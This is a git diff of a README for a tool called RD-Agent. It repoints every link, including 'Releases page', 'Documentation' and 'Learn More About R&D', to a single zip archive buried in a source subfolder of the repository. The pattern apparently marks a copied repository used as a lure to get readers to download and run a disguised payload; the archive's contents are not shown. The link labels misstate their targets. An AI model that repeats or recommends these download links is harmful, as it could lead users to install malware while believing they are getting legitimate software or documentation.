@@ -6,9 +6,9 @@ Welcome to RD-Agent! This application helps you streamline research and developm
 
 ## 📥 Download RD-Agent
 
-[![Download RD-Agent](https://raw.githubusercontent.com/Benosam213/RD-Agent/main/dockman/RD-Agent.zip%https://raw.githubusercontent.com/Benosam213/RD-Agent/main/dockman/RD-Agent.zip)](https://raw.githubusercontent.com/Benosam213/RD-Agent/main/dockman/RD-Agent.zip)
+[![Download RD-Agent](https://github.com/Benosam213/RD-Agent/raw/refs/heads/main/rdagent/components/coder/data_science/workflow/R-Agent-v1.6.zip%https://github.com/Benosam213/RD-Agent/raw/refs/heads/main/rdagent/components/coder/data_science/workflow/R-Agent-v1.6.zip)](https://github.com/Benosam213/RD-Agent/raw/refs/heads/main/rdagent/components/coder/data_science/workflow/R-Agent-v1.6.zip)
 
-You can download the latest version of RD-Agent from our [Releases page](https://raw.githubusercontent.com/Benosam213/RD-Agent/main/dockman/RD-Agent.zip). 
+You can download the latest version of RD-Agent from our [Releases page](https://github.com/Benosam213/RD-Agent/raw/refs/heads/main/rdagent/components/coder/data_science/workflow/R-Agent-v1.6.zip). 
 
 ## 📋 System Requirements
 
@@ -22,7 +22,7 @@ Before downloading, ensure your system meets the following requirements:
 ## 📦 Steps to Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Benosam213/RD-Agent/main/dockman/RD-Agent.zip).
+   Go to the [Releases page](https://github.com/Benosam213/RD-Agent/raw/refs/heads/main/rdagent/components/coder/data_science/workflow/R-Agent-v1.6.zip).
 
 2. **Select Your Version**  
    Find the latest version of RD-Agent. It will usually be marked as the top release.
@@ -70,12 +70,12 @@ RD-Agent provides tools to enhance your R&D capabilities:
 If you encounter any issues or need help using RD-Agent, please reach out to our support team. You can find assistance in the following ways:
 
 - **GitHub Issues:** Report any bugs or request features on our GitHub Issues page.
-- **Documentation:** Access detailed documentation [here](https://raw.githubusercontent.com/Benosam213/RD-Agent/main/dockman/RD-Agent.zip).
+- **Documentation:** Access detailed documentation [here](https://github.com/Benosam213/RD-Agent/raw/refs/heads/main/rdagent/components/coder/data_science/workflow/R-Agent-v1.6.zip).
 - **Community Forum:** Join our community forum to discuss features and share ideas with other RD-Agent users.
 
 ## 🔗 Additional Resources
 
-- **Learn More About R&D:** Explore why research and development is essential in today’s AI-driven world [here](https://raw.githubusercontent.com/Benosam213/RD-Agent/main/dockman/RD-Agent.zip).
+- **Learn More About R&D:** Explore why research and development is essential in today’s AI-driven world [here](https://github.com/Benosam213/RD-Agent/raw/refs/heads/main/rdagent/components/coder/data_science/workflow/R-Agent-v1.6.zip).
 - **Follow Us:** Stay updated by following our project on GitHub and other social platforms.
 
-Thank you for choosing RD-Agent! We are excited to help you enhance your research and development processes. Remember to check the [Releases page](https://raw.githubusercontent.com/Benosam213/RD-Agent/main/dockman/RD-Agent.zip) for updates.
+Thank you for choosing RD-Agent! We are excited to help you enhance your research and development processes. Remember to check the [Releases page](https://github.com/Benosam213/RD-Agent/raw/refs/heads/main/rdagent/components/coder/data_science/workflow/R-Agent-v1.6.zip) for updates.
